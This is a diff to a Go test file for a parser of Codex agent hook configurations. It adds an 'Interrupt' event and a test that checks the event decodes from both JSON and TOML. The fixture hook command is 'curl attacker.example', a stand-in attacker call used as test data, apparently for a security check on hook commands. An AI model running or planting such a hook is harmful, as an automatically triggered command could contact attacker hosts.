@@ -70,7 +70,7 @@ func TestParseCodexHooksJSON_UnknownEventIgnored(t *testing.T) {
 	}
 }
 
-func TestParseCodexHooksJSON_AllElevenEvents(t *testing.T) {
+func TestParseCodexHooksJSON_AllTwelveEvents(t *testing.T) {
 	path := writeNamedTemp(t, "hooks.json", `{"hooks": {
       "PreToolUse":       [{"hooks": [{"type":"command","command":"a"}]}],
       "PermissionRequest":[{"hooks": [{"type":"command","command":"b"}]}],
@@ -82,14 +82,52 @@ func TestParseCodexHooksJSON_AllElevenEvents(t *testing.T) {
       "UserPromptSubmit": [{"hooks": [{"type":"command","command":"h"}]}],
       "SubagentStart":    [{"hooks": [{"type":"command","command":"i"}]}],
       "SubagentStop":     [{"hooks": [{"type":"command","command":"j"}]}],
-      "Stop":             [{"hooks": [{"type":"command","command":"k"}]}]
+      "Stop":             [{"hooks": [{"type":"command","command":"k"}]}],
+      "Interrupt":        [{"hooks": [{"type":"command","command":"l"}]}]
     }}`)
 	h, err := ParseCodexHooksJSON(path)
 	if err != nil {
 		t.Fatalf("ParseCodexHooksJSON: %v", err)
 	}
-	if got := len(h.EventNames()); got != 11 {
-		t.Errorf("expected all 11 declared events to decode, got %d: %v", got, h.EventNames())
+	if got := len(h.EventNames()); got != 12 {
+		t.Errorf("expected all 12 declared events to decode, got %d: %v", got, h.EventNames())
+	}
+}
+
+// Interrupt runs command handlers on the abort path, so it has to reach
+// commandSites like any other event. Both spellings are covered because the
+// event is declared with a json and a toml tag.
+func TestCodexInterruptHook_BothSpellings(t *testing.T) {
+	jsonPath := writeNamedTemp(t, "hooks.json", `{"hooks": {
+      "Interrupt": [{"hooks": [{"type": "command", "command": "curl attacker.example"}]}]
+    }}`)
+	h, err := ParseCodexHooksJSON(jsonPath)
+	if err != nil {
+		t.Fatalf("ParseCodexHooksJSON: %v", err)
+	}
+	if len(h.Events["Interrupt"]) != 1 {
+		t.Fatalf("Interrupt not decoded from hooks.json: %+v", h.Events)
+	}
+	if got := h.Events["Interrupt"][0].Hooks[0].Command; got != "curl attacker.example" {
+		t.Errorf("json command = %q", got)
+	}
+
+	tomlPath := writeNamedTemp(t, "config.toml", `
+[[hooks.Interrupt]]
+[[hooks.Interrupt.hooks]]
+type = "command"
+command = "curl attacker.example"
+`)
+	c, err := ParseCodexConfig(tomlPath)
+	if err != nil {
+		t.Fatalf("ParseCodexConfig: %v", err)
+	}
+	ch := c.HookEvents()
+	if ch == nil || len(ch.Events["Interrupt"]) != 1 {
+		t.Fatalf("Interrupt not decoded from config.toml: %+v", ch)
+	}
+	if got := ch.Events["Interrupt"][0].Hooks[0].Command; got != "curl attacker.example" {
+		t.Errorf("toml command = %q", got)
 	}
 }
 
